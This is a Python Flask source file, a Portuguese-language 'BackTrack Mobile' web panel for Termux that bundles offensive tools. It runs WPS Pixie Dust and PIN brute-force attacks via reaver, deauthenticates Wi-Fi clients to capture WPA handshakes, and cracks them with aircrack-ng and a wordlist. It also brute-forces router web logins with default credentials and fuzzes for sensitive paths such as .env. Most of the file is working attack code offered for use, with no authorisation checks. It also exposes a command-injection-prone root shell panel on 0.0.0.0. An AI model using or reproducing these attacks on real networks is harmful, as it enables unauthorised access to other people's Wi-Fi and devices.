#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BACKTRACK MOBILE - ULTIMATE SUITE v2
Painel web de auditoria para Termux.

Módulos Wi-Fi (WPA/WPS) exigem: binários instalados e, para ataques
ativos, root + adaptador em modo monitor (chips de celular raramente
suportam). A quebra de handshake com wordlist funciona sem root.
"""

import json
import os
import re
import shutil
import socket
import subprocess
import threading
import time
import ipaddress
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from urllib.parse import urlsplit

import requests
from flask import Flask, request, render_template_string

app = Flask(__name__)

HOST = "0.0.0.0"
PORT = 5000
TIMEOUT = 5

# Diretório de trabalho para capturas e resultados
WORKDIR = os.path.expanduser("~/backtrack_data")
os.makedirs(WORKDIR, exist_ok=True)


# ==========================================
# INTERFACE HTML
# ==========================================

HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BackTrack Mobile - Ultimate Suite</title>
    <style>
        * { box-sizing: border-box; }
        body {
            background: linear-gradient(rgba(12,12,12,.85), rgba(12,12,12,.92)), url('https://images.unsplash.com/photo-1550751827-4bd374c3f58b?q=80&w=1200&auto=format&fit=crop');
            background-size: cover; background-position: center; background-attachment: fixed;
            color: #00ff66; font-family: monospace; padding: 15px; margin: 0;
        }
        h1 { color: #ff3333; text-align: center; font-size: 25px; margin-bottom: 20px; text-shadow: 0 0 8px #700; }
        .card { background: rgba(32,32,32,.9); padding: 16px; margin-bottom: 16px; border-radius: 9px; border: 1px solid #444; backdrop-filter: blur(5px); }
        label { display: block; margin-top: 14px; color: #aaa; font-weight: bold; font-size: 13px; }
        input, select, button { width: 100%; padding: 13px; margin-top: 8px; background: #303030; color: white; border: 1px solid #555; border-radius: 5px; font-size: 15px; }
        button { background: #b52b27; border: none; font-weight: bold; cursor: pointer; margin-top: 15px; }
        button:hover { background: #e04440; }
        pre { background: #050505; color: #00ff66; padding: 14px; border: 1px solid #333; border-radius: 6px; white-space: pre-wrap; overflow-wrap: anywhere; font-size: 13px; }
        .shortcuts { display: flex; gap: 6px; flex-wrap: wrap; margin-top: 8px; }
        .shortcut-btn { background: #202020; border: 1px solid #00ff66; color: #00ff66; padding: 6px 10px; font-size: 12px; border-radius: 4px; cursor: pointer; width: auto; margin-top: 0; }
        .shortcut-btn:hover { background: #00ff66; color: #000; }
        .info { color: #aaa; font-size: 12px; line-height: 1.6; }
        .footer { color: #777; text-align: center; font-size: 12px; margin-top: 25px; }
    </style>
</head>
<body>
<h1>BACKTRACK MOBILE // SUITE</h1>

<div class="card">
    <h3>Painel de Controle e Auditoria</h3>
    <p class="info">Recon Wi-Fi, WPS/WPA, fuzzing, portas e auditoria web.</p>

    <form method="POST">
        <label>Alvo (BSSID para Wi-Fi / IP-Domínio-URL para o resto):</label>
        <input type="text" id="targetInput" name="target" value="{{ target }}" placeholder="Ex: AA:BB:CC:DD:EE:FF ou 192.168.1.1">

        <label>Parâmetro extra (interface p/ monitor, wordlist, canal...):</label>
        <input type="text" name="extra" value="{{ extra }}" placeholder="Ex: wlan0 / ~/wordlist.txt / 6">

        <label>Atalhos Rápidos:</label>
        <div class="shortcuts">
            <button type="button" class="shortcut-btn" onclick="setTarget('192.168.1.1')">Roteador Local</button>
            <button type="button" class="shortcut-btn" onclick="setTarget('scanme.nmap.org')">Scanme Nmap</button>
        </div>

        <label>Ferramenta / Operação:</label>
        <select name="tool">
            <option value="wifi_audit">1. Scanner de Redes Wi-Fi (Termux-API)</option>
            <option value="connection">2. Informações da Conexão Atual</option>
            <option value="wifi_caps">3. Diagnóstico de Capacidades de Ataque</option>
            <option value="wps_pixie">4. WPS Pixie Dust (Reaver) - requer monitor</option>
            <option value="wps_pin">5. WPS PIN Brute Force (Reaver) - requer monitor</option>
            <option value="wpa_handshake">6. Captura de Handshake WPA - requer monitor</option>
            <option value="wpa_crack">7. Quebra de Handshake c/ Wordlist (sem root)</option>
            <option value="ports">8. Scanner de Portas TCP + Banners</option>
            <option value="vuln_check">9. Auditoria de Headers HTTP</option>
            <option value="ping_check">10. Teste de Conectividade</option>
            <option value="dns_info">11. Consulta DNS</option>
            <option value="dirs">12. Fuzzing de Diretórios Web</option>
            <option value="inspect_deep">13. Inspeção de Inputs HTML</option>
            <option value="brute_challenge">14. Força Bruta Web c/ Bypass de Challenge</option>
        </select>

        <button type="submit">EXECUTAR OPERAÇÃO</button>
    </form>
</div>

{% if result %}
<div class="card"><h3>Resultado:</h3><pre>{{ result }}</pre></div>
{% endif %}

<div class="footer">BACKTRACK MOBILE FRAMEWORK<br>Python + Flask + Termux-API + Aircrack suite</div>
</body>
</html>
"""


# ==========================================
# HELPERS DE SISTEMA
# ==========================================

def run_command(command, timeout=10, check=True):
    """Executa comando (lista ou string). Retorna stdout+stderr."""
    argv = command if isinstance(command, list) else command
    if isinstance(argv, list) and not shutil.which(argv[0]):
        raise RuntimeError(f"Comando não instalado: {argv[0]}. Instale com: pkg install <pacote>")

    process = subprocess.run(
        argv,
        capture_output=True, text=True, timeout=timeout,
        shell=not isinstance(command, list)
    )
    output = (process.stdout or "") + ("\n" + process.stderr if process.stderr else "")
    if check and process.returncode != 0 and not output.strip():
        raise RuntimeError("Falha na execução do comando.")
    return output


def run_termux_json(cmd, timeout=10):
    """Executa comando termux-* e valida JSON."""
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=timeout).decode("utf-8", errors="ignore").strip()
    except subprocess.TimeoutExpired:
        raise RuntimeError("O Termux:API não respondeu (app instalado?).")
    except FileNotFoundError:
        raise RuntimeError("CLI ausente. Instale: pkg install termux-api")
    if not output:
        raise RuntimeError("Saída vazia do Termux:API.")
    return json.loads(output)


def get_hostname(target):
    target = target.strip()
    if not target:
        raise ValueError("Informe um endereço.")
    if "://" not in target:
        target = "http://" + target
    parsed = urlsplit(target)
    if parsed.username or parsed.password:
        raise ValueError("Credenciais na URL não permitidas.")
    if parsed.scheme not in ("http", "https"):
        raise ValueError("Protocolo não permitido.")
    if not parsed.hostname:
        raise ValueError("Endereço inválido.")
    return parsed.hostname


def resolve_addresses(hostname):
    try:
        records = socket.getaddrinfo(hostname, None, socket.AF_INET)
        addresses = sorted({item[4][0] for item in records})
        if not addresses:
            raise ValueError("Nenhum IP encontrado.")
        return addresses
    except socket.gaierror:
        raise ValueError("Falha na resolução DNS.")


def pick_scheme(hostname):
    """Tenta HTTPS primeiro, cai para HTTP."""
    for scheme in ("https", "http"):
        try:
            requests.get(f"{scheme}://{hostname}", timeout=3, allow_redirects=False)
            return f"{scheme}://{hostname}"
        except requests.RequestException:
            continue
    raise ValueError("Alvo inacessível em HTTP e HTTPS.")


def has_root():
    return shutil.which("su") is not None


# ==========================================
# MÓDULO WI-FI: CAPACIDADES E ATAQUES
# ==========================================

WIRELESS_TOOLS_OK = shutil.which("iw")

def check_attack_capabilities():
    """Verifica root, modo monitor e ferramentas. Retorna relatório."""
    result = "[*] DIAGNÓSTICO DE CAPACIDADES DE ATAQUE Wi-Fi\n====================================\n\n"

    result += f"[{'+' if has_root() else '-'}] Root (su): {'DISPONÍVEL' if has_root() else 'AUSENTE'}\n"

    tools = {
        "airodump-ng": ("aircrack-ng", "captura de handshake"),
        "aireplay-ng": ("aircrack-ng", "deauth/injeção"),
        "aircrack-ng": ("aircrack-ng", "quebra de handshake"),
        "reaver": ("reaver", "WPS PIN/Pixie Dust"),
        "wash": ("reaver", "detecção de WPS"),
        "iw": ("iw", "gerência de interface"),
    }
    for binary, (pkg, use) in tools.items():
        result += f"[{'+' if shutil.which(binary) else '-'}] {binary} ({use}) -> {'OK' if shutil.which(binary) else 'instale: pkg install ' + pkg}\n"

    # Verifica interfaces de rede e modo monitor
    result += "\n[*] Interfaces de rede:\n"
    try:
        ip_out = run_command(["ip", "-o", "link", "show"], check=False)
        for line in ip_out.splitlines():
            m = re.match(r"\d+:\s+(\S+):", line)
            if m:
                result += f"    - {m.group(1)}\n"
    except Exception as e:
        result += f"    [-] Erro listando interfaces: {e}\n"

    monitor_ok = False
    if WIRELESS_TOOLS_OK and has_root():
        try:
            iw_out = run_command(["iw", "dev"], check=False)
            interfaces = re.findall(r"Interface\s+(\S+)", iw_out)
            for iface in interfaces:
                try:
                    info = run_command(["iw", "dev", iface, "info"], check=False)
                    if "monitor" in info:
                        monitor_ok = True
                        result += f"\n[+] Interface {iface} JÁ ESTÁ EM MODO MONITOR\n"
                except Exception:
                    pass
        except Exception:
            pass

    if not monitor_ok:
        result += (
            "\n[!] IMPORTANTE — leia antes de tentar ataques ativos:\n"
            "    - A maioria dos chips Wi-Fi de celular NÃO suporta modo monitor.\n"
            "    - Sem modo monitor, captura de handshake e WPS não funcionam.\n"
            "    - Alternativa viável no celular SEM root:\n"
            "      capture o handshake numa máquina Kali/PC com adaptador\n"
            "      compatível, copie o .cap para o celular e use a opção 7\n"
            "      (quebra com wordlist) — ela funciona 100% em userspace.\n"
            "    - Com root + adaptador USB compatível (ex.: TL-WN722N v1)\n"
            "      via OTG, é possível ativar monitor: veja opção 3 de novo\n"
            "      após conectar.\n"
        )
    return result


def try_enable_monitor(interface, channel=None):
    """Tenta colocar interface em modo monitor (requer root)."""
    if not has_root():
        raise RuntimeError("Root necessário para modo monitor.")
    run_command(["su", "-c", f"ip link set dev {interface} down"], check=False)
    run_command(["su", "-c", f"iw dev {interface} set type monitor"], check=False)
    run_command(["su", "-c", f"ip link set dev {interface} up"], check=False)
    if channel:
        run_command(["su", "-c", f"iw dev {interface} set channel {channel}"], check=False)
    info = run_command(["iw", "dev", interface, "info"], check=False)
    if "monitor" not in info:
        raise RuntimeError(
            f"Interface {interface} não aceitou modo monitor.\n"
            "Chip de celular geralmente não suporta. Use adaptador USB compatível."
        )
    return True


def find_target_channel(bssid):
    """Procura BSSID no último scan para achar canal/frequência."""
    try:
        networks = run_termux_json("termux-wifi-scaninfo", timeout=12)
        for net in networks:
            if isinstance(net, dict) and net.get("bssid", "").lower() == bssid.lower():
                freq = net.get("frequency_mhz", net.get("frequency", 0)) or 0
                if 2400 <= freq <= 2500:
                    return int(round((freq - 2412) / 5)) + 1
    except Exception:
        pass
    return None


def wps_attack(target, extra, pixie=True):
    """WPS Pixie Dust ou PIN brute force com reaver."""
    mode = "Pixie Dust" if pixie else "PIN brute force"
    result = f"[*] ATAQUE WPS — {mode}\n====================================\n\n"

    bssid = target.strip().lower()
    if not re.match(r"^([0-9a-f]{2}:){5}[0-9a-f]{2}$", bssid):
        raise ValueError("Informe o BSSID no formato AA:BB:CC:DD:EE:FF (do scanner Wi-Fi).")

    interface = extra.strip() or "wlan0"
    result += f"BSSID alvo: {bssid}\nInterface: {interface}\n\n"

    # Pré-checagem: capacidade + WPS ativo
    result += check_attack_capabilities()

    channel = find_target_channel(bssid)
    if channel:
        result += f"[+] Canal estimado do alvo (via scan): {channel}\n"
        extra_args = ["-c", str(channel)]
    else:
        result += "[!] Canal desconhecido — reaver varrerá (mais lento).\n"
        extra_args = []

    try:
        try_enable_monitor(interface, channel)
    except RuntimeError as e:
        result += f"\n[-] Modo monitor: {e}\n"
        return result

    result += f"[+] Interface {interface} em modo monitor. Iniciando reaver...\n"
    result += "[*] Isso pode demorar MUITOS minutos (PIN brute force) ou ~1min (Pixie).\n\n"

    # Reaver: -vv verboso, -K 1 executa pixie dust automaticamente
    cmd = ["reaver", "-i", interface, "-b", bssid, "-vv"] + extra_args
    if pixie:
        cmd += ["-K", "1"]

    try:
        process = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1
        )
        # Lê em tempo real, filtra linhas de interesse
        for line in process.stdout:
            line = line.strip()
            if re.search(r"(WPS PIN|PIN|password|WPA|key|pixie|failed|error|warning)", line, re.IGNORECASE):
                result += line + "\n"
        process.wait(timeout=3600)
    except subprocess.TimeoutExpired:
        process.kill()
        result += "\n[!] Timeout de 1h atingido. Ataque interrompido.\n"
    except FileNotFoundError:
        result += "[-] reaver não instalado. pkg install reaver\n"
    finally:
        # Restaura interface para managed
        run_command(["su", "-c", f"ip link set dev {interface} down"], check=False)
        run_command(["su", "-c", f"iw dev {interface} set type managed"], check=False)
        run_command(["su", "-c", f"ip link set dev {interface} up"], check=False)
        result += "\n[*] Interface restaurada para modo managed.\n"

    return result


def wpa_handshake_capture(target, extra):
    """Captura handshake WPA de um BSSID com airodump + deauth."""
    result = "[*] CAPTURA DE HANDSHAKE WPA\n====================================\n\n"

    parts = target.split()
    bssid = parts[0].strip().lower() if parts else ""
    if not re.match(r"^([0-9a-f]{2}:){5}[0-9a-f]{2}$", bssid):
        raise ValueError("Informe o BSSID (AA:BB:CC:DD:EE:FF), opcionalmente seguido do canal: 'AA:BB:CC:DD:EE:FF 6'")

    interface = extra.strip() or "wlan0"
    channel = parts[1] if len(parts) > 1 else str(find_target_channel(bssid) or "")
    if not channel:
        raise ValueError("Canal desconhecido — informe: 'BSSID canal' (ex.: 'AA:BB:CC:DD:EE:FF 6')")

    prefix = os.path.join(WORKDIR, f"cap_{bssid.replace(':', '')}")
    result += f"BSSID: {bssid} | Canal: {channel} | Interface: {interface}\n"
    result += f"Arquivo de captura: {prefix}-01.cap\n\n"

    try:
        try_enable_monitor(interface, channel)
    except RuntimeError as e:
        result += f"[-] Modo monitor: {e}\n"
        return result

    # 1) airodump captura no canal do alvo, filtro BSSID
    dump = subprocess.Popen(
        ["airodump-ng", "-c", channel, "--bssid", bssid, "-w", prefix, interface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    time.sleep(10)  # aguarda ver clientes conectados

    # 2) deauth para forçar reassociation e capturar handshake
    result += "[*] Enviando deauth (2 pacotes) para forçar handshake...\n"
    run_command(["aireplay-ng", "--deauth", "2", "-a", bssid, interface], check=False)
    result += "[*] Aguardando 30s por handshake...\n"
    time.sleep(30)
    dump.terminate()
    dump.wait(timeout=10)

    # Restaura interface
    run_command(["su", "-c", f"ip link set dev {interface} down"], check=False)
    run_command(["su", "-c", f"iw dev {interface} set type managed"], check=False)
    run_command(["su", "-c", f"ip link set dev {interface} up"], check=False)

    # 3) verifica handshake no cap
    cap_file = f"{prefix}-01.cap"
    if not os.path.exists(cap_file):
        result += "[-] Arquivo de captura não gerado.\n"
        return result

    check = run_command(["aircrack-ng", cap_file], check=False)
    if "handshake" in check.lower() or "WPA (1 handshake" in check:
        result += (
            f"[+] HANDSHAKE CAPTURADO: {cap_file}\n"
            "[*] Use a opção 7 (Quebra de Handshake) com uma wordlist.\n"
        )
    else:
        result += "[-] Handshake não capturado. Tente novamente com clientes ativos na rede.\n"

    return result


def wpa_crack(target, extra):
    """Quebra handshake com wordlist — funciona SEM root (aircrack em CPU)."""
    result = "[*] QUEBRA DE HANDSHAKE COM WORDLIST\n====================================\n\n"

    cap_file = target.strip()
    wordlist = extra.strip() or os.path.join(WORKDIR, "wordlist.txt")

    if not cap_file or not os.path.isfile(cap_file):
        raise ValueError(f"Arquivo de captura inválido: '{cap_file}'. Caminho absoluto do .cap/.pcap.")
    if not os.path.isfile(wordlist):
        common_words = ["12345678", "password", "admin123", "qwerty123", "1234567890",
                        "senha123", "wireless", "internet", "minharede", "1234567891"]
        with open(wordlist, "w") as f:
            f.write("\n".join(common_words) + "\n")
        result += (
            f"[!] Wordlist não encontrada. Criei uma mínima em {wordlist}.\n"
            "[*] Para ataques reais, baixe wordlists (ex.: rockyou.txt):\n"
            "    curl -L -o ~/backtrack_data/wordlist.txt <URL da wordlist>\n"
            "    (rockyou.txt: ~130MB, ~14 milhões de senhas)\n\n"
        )

    result += f"Captura: {cap_file}\nWordlist: {wordlist}\n\n"
    result += "[*] Executando aircrack-ng (pode demorar conforme a wordlist)...\n"

    output = run_command(["aircrack-ng", "-w", wordlist, "-b", os.path.basename(cap_file)[:12], cap_file],
                         timeout=1800, check=False)

    key_match = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", output)
    if key_match:
        result += f"\n[!] SENHA ENCONTRADA: {key_match.group(1)}\n"
    else:
        result += (
            "[-] Senha não encontrada nesta wordlist.\n"
            "[*] Dicas: use wordlists maiores (rockyou), regras de mutação\n"
            "    (hashcat rules) ou verifique se o handshake estava correto.\n"
        )
    return result


# ==========================================
# MÓDULOS WI-FI INFORMATIVOS
# ==========================================

def band_info(frequency_mhz):
    if not isinstance(frequency_mhz, (int, float)) or frequency_mhz <= 0:
        return "?", "?"
    if 2400 <= frequency_mhz <= 2500:
        return "2.4 GHz", int(round((frequency_mhz - 2412) / 5)) + 1
    if 5150 <= frequency_mhz <= 5895:
        return "5 GHz", "?"
    if 5900 <= frequency_mhz <= 7110:
        return "6 GHz", "?"
    return f"{frequency_mhz} MHz", "?"


def security_hint(net):
    caps = str(net.get("capabilities", "")).lower()
    if "wpa3" in caps or "sae" in caps:
        return "WPA3"
    if "wpa2" in caps or "rsn" in caps or "psk" in caps:
        return "WPA2"
    if "wpa" in caps:
        return "WPA"
    if "wep" in caps:
        return "WEP (fraco!)"
    return "Aberta/Desconhecida"


def rssi_quality(rssi):
    if not isinstance(rssi, (int, float)):
        return "?"
    if rssi >= -50: return "Excelente"
    if rssi >= -60: return "Boa"
    if rssi >= -70: return "Regular"
    if rssi >= -80: return "Fraca"
    return "Muito fraca"


def wifi_scan():
    result = f"[*] WI-FI SCANNER\n====================================\nScan: {datetime.now().strftime('%H:%M:%S')}\n\n"
    networks = None
    for attempt in range(1, 4):
        try:
            data = run_termux_json("termux-wifi-scaninfo", timeout=12)
            if isinstance(data, list) and data:
                networks = data
                break
            if attempt < 3:
                result += f"[*] Cache vazio (tentativa {attempt}/3). Aguardando 10s...\n"
                time.sleep(10)
        except RuntimeError as e:
            result += f"[-] Tentativa {attempt}: {e}\n"

    if networks is None:
        result += (
            "\n[-] Nenhuma rede após 3 tentativas. Correções:\n"
            "    1. Termux:API > Permissões > LOCALIZAÇÃO = Permitir\n"
            "    2. Ative serviços de localização do Android\n"
            "    3. Abra Config > Wi-Fi p/ forçar scan novo\n"
            "    4. Máx. 4 scans/2min (throttle Android)\n"
            "    5. App Termux:API da MESMA fonte do Termux\n"
        )
        return result

    enriched = []
    for net in networks:
        if not isinstance(net, dict):
            continue
        freq = net.get("frequency_mhz", net.get("frequency", 0))
        band, channel = band_info(freq)
        enriched.append({
            "ssid": net.get("ssid") or "[Rede oculta]",
            "bssid": net.get("bssid", "N/A"),
            "rssi": net.get("rssi", net.get("level", -999)),
            "band": band, "channel": channel,
            "security": security_hint(net),
        })
    enriched.sort(key=lambda n: n["rssi"] if isinstance(n["rssi"], (int, float)) else -999, reverse=True)

    result += f"[+] Redes: {len(enriched)}\n"
    result += f"[!] Sem criptografia aparente: {sum(1 for n in enriched if 'Aberta' in n['security'])}\n\n"

    for idx, net in enumerate(enriched, 1):
        wps_flag = " [WPS possível — teste opção 4/5]" if net["security"] in ("WPA2", "WPA3", "Aberta/Desconhecida") else ""
        result += (
            f"[{idx}] {net['ssid']}\n"
            f"    BSSID: {net['bssid']} | {net['band']} Ch {net['channel']}\n"
            f"    Sinal: {net['rssi']} dBm ({rssi_quality(net['rssi'])})\n"
            f"    Segurança: {net['security']}{wps_flag}\n"
            "    ------------------------------------\n"
        )
    result += "\n[*] Para atacar via WPS/handshake, copie o BSSID da rede alvo.\n"
    return result


def connection_info():
    result = "[*] CONEXÃO WI-FI ATUAL\n====================================\n\n"
    try:
        info = run_termux_json("termux-wifi-connectioninfo", timeout=8)
        freq = info.get("frequency_mhz", info.get("frequency", 0))
        band, channel = band_info(freq)
        result += (
            f"SSID: {info.get('ssid', 'N/A')}\n"
            f"BSSID: {info.get('bssid', 'N/A')}\n"
            f"IP: {info.get('ip', 'N/A')}\n"
            f"Gateway: {info.get('gateway', 'N/A')}\n"
            f"Sinal: {info.get('rssi', 'N/A')} dBm\n"
            f"Banda/Canal: {band} / Ch {channel}\n"
        )
    except Exception as e:
        result += f"[-] Erro: {e}\n"
    return result


# ==========================================
# MÓDULOS WEB/REDE (mantidos e otimizados)
# ==========================================

def port_check(target):
    hostname = get_hostname(target)
    addresses = resolve_addresses(hostname)
    ports = {21: "FTP", 22: "SSH", 53: "DNS", 80: "HTTP", 443: "HTTPS", 3389: "RDP", 8080: "HTTP-alt"}

    result = f"[*] PORTAS TCP + BANNERS\n====================================\nAlvo: {hostname}\nIP: {', '.join(addresses)}\n\n"

    def scan_port(address, port):
        try:
            with socket.create_connection((address, port), timeout=1.0) as s:
                banner = ""
                try:
                    if port in (80, 8080, 443):
                        s.send(b"HEAD / HTTP/1.0\r\n\r\n")
                    banner = s.recv(256).decode(errors="ignore").split("\n")[0].strip()
                except Exception:
                    pass
                line = f"[+] Porta {port} ({ports[port]}) -> ABERTA"
                if banner:
                    line += f"\n    └─ Banner: {banner}"
                return line
        except Exception:
            return f"[-] Porta {port} ({ports[port]}) -> Fechada/Filtrada"

    for address in addresses:
        result += f"Endereço: {address}\n"
        with ThreadPoolExecutor(max_workers=10) as ex:
            futures = [ex.submit(scan_port, address, p) for p in ports]
            for f in futures:
                result += f.result() + "\n"
        result += "\n"
    return result


def ping_check(target):
    hostname = get_hostname(target)
    addresses = resolve_addresses(hostname)
    output = run_command(["ping", "-c", "3", "-W", "2", addresses[0]], timeout=9, check=False)
    return f"[*] PING\n====================================\nAlvo: {hostname}\n\n{output}"


def dns_info(target):
    hostname = get_hostname(target)
    addresses = resolve_addresses(hostname)
    result = f"[*] DNS\n====================================\nDomínio: {hostname}\n\n"
    for a in addresses:
        result += f"[+] IPv4: {a}\n"
    return result


def web_headers(target):
    hostname = get_hostname(target)
    url = target if "://" in target else pick_scheme(hostname)
    result = f"[*] AUDITORIA DE HEADERS HTTP\n====================================\nURL: {url}\n\n"
    with requests.Session() as http:
        http.trust_env = False
        response = http.get(url, timeout=TIMEOUT, allow_redirects=False)
    result += f"Status: {response.status_code}\nServidor: {response.headers.get('Server', 'N/A')}\n\n"
    for h in ["Content-Security-Policy", "X-Content-Type-Options", "X-Frame-Options",
              "Strict-Transport-Security", "Referrer-Policy"]:
        result += f"[+] {h}: CONFIGURADO\n" if h in response.headers else f"[-] {h}: AUSENTE\n"
    return result


def fuzzing_dirs(target):
    hostname = get_hostname(target)
    base_url = target if "://" in target else pick_scheme(hostname)
    result = f"[*] FUZZING DE DIRETÓRIOS\n====================================\nAlvo: {base_url}\n\n"
    dirs = ["admin", "login", "dashboard", "config.php", "backup.zip", ".env", "robots.txt", "administrator"]

    session = requests.Session()
    def probe(d):
        try:
            r = session.get(f"{base_url}/{d}", timeout=2.0)
            if r.status_code == 200:
                return f"[!] ALERTA [200 OK] -> /{d}"
            return f"[+] [{r.status_code}] -> /{d}" if r.status_code != 404 else f"[-] [404] -> /{d}"
        except Exception:
            return f"[Inacessível] -> /{d}"

    with ThreadPoolExecutor(max_workers=8) as ex:
        results = list(ex.map(probe, dirs))
    result += "\n".join(results) + "\n"
    return result


def inspect_deep(target):
    hostname = get_hostname(target)
    url = target if "://" in target else pick_scheme(hostname)
    result = f"[*] INSPEÇÃO DE INPUTS HTML\n====================================\nURL: {url}\n\n"
    r_page = requests.get(url, timeout=4.0)
    inputs_raw = re.findall(r"<input[^>]+>", r_page.text, re.IGNORECASE)
    result += f"[+] Total de <input>: {len(inputs_raw)}\n\n"
    for idx, tag in enumerate(inputs_raw, 1):
        name_m = re.search(r'name=["\']([^"\']+)["\']', tag, re.I)
        id_m = re.search(r'id=["\']([^"\']+)["\']', tag, re.I)
        type_m = re.search(r'type=["\']([^"\']+)["\']', tag, re.I)
        result += f"  [{idx}] Tipo: {type_m.group(1) if type_m else 'text'} | ID: '{id_m.group(1) if id_m else '-'}' | Name: '{name_m.group(1) if name_m else '-'}'\n"
    return result


def brute_challenge(target):
    hostname = get_hostname(target)
    url = target if "://" in target else pick_scheme(hostname)
    result = f"[*] FORÇA BRUTA WEB (challenge bypass)\n====================================\nAlvo: {url}\n\n"

    users = ["admin", "root", "support", "user"]
    passwords = ["admin123", "password", "123456", "root", "toor", "admin", "1234", "password123"]
    tentativas, sucesso = 0, False

    for u in users:
        for p in passwords:
            tentativas += 1
            try:
                r_page = requests.get(url, timeout=3.0)
                challenge_match = re.search(
                    r'name=["\']challenge["\'][^>]*value=["\']([^"\']*)["\']',
                    r_page.text, re.IGNORECASE | re.DOTALL
                )
                payload = {
                    'username': u, 'password': p,
                    'challenge': challenge_match.group(1) if challenge_match else "",
                    'submit-url': '/admin/login.asp', 'postSecurityFlag': ''
                }
                r = requests.Session().post(url, data=payload, timeout=3.0, allow_redirects=True)
                if r.status_code == 200 and not r.history:
                    txt = r.text.lower()
                    if not any(w in txt for w in ("invalid", "error", "falha", "incorrect")):
                        result += f"[!] SUCESSO! Usuário: {u} | Senha: {p}\n"
                        sucesso = True
                        break
            except Exception:
                pass
        if sucesso:
            break

    if not sucesso:
        result += f"[-] Concluído após {tentativas} tentativas.\n"
    return result


# ==========================================
# ROTA PRINCIPAL
# ==========================================

@app.route("/", methods=["GET", "POST"])
def index():
    result = ""
    target = "192.168.1.1"
    extra = ""

    if request.method == "POST":
        target = request.form.get("target", "192.168.1.1").strip()
        extra = request.form.get("extra", "").strip()
        tool = request.form.get("tool", "")

        operations = {
            "wifi_audit": wifi_scan,
            "connection": connection_info,
            "wifi_caps": check_attack_capabilities,
            "wps_pixie": lambda: wps_attack(target, extra, pixie=True),
            "wps_pin": lambda: wps_attack(target, extra, pixie=False),
            "wpa_handshake": lambda: wpa_handshake_capture(target, extra),
            "wpa_crack": lambda: wpa_crack(target, extra),
            "ports": lambda: port_check(target),
            "vuln_check": lambda: web_headers(target),
            "ping_check": lambda: ping_check(target),
            "dns_info": lambda: dns_info(target),
            "dirs": lambda: fuzzing_dirs(target),
            "inspect_deep": lambda: inspect_deep(target),
            "brute_challenge": lambda: brute_challenge(target),
        }

        if tool not in operations:
            result = "[-] Operação inválida."
        else:
            try:
                result = operations[tool]()
            except subprocess.TimeoutExpired:
                result = "[-] Tempo limite excedido."
            except requests.RequestException as error:
                result = f"[-] Erro HTTP: {error}"
            except (ValueError, RuntimeError) as error:
                result = f"[-] {error}"
            except Exception as error:
                result = f"[-] Erro: {error}"

    return render_template_string(HTML_TEMPLATE, result=result, target=target, extra=extra)


if __name__ == "__main__":
    print("=" * 45)
    print("       BACKTRACK MOBILE // SUITE v2")
    print("=" * 45)
    print(f"Painel: http://{HOST}:{PORT}")
    print(f"Dados em: {WORKDIR}")
    print("=" * 45)
    app.run(host=HOST, port=PORT, debug=False, use_reloader=False)
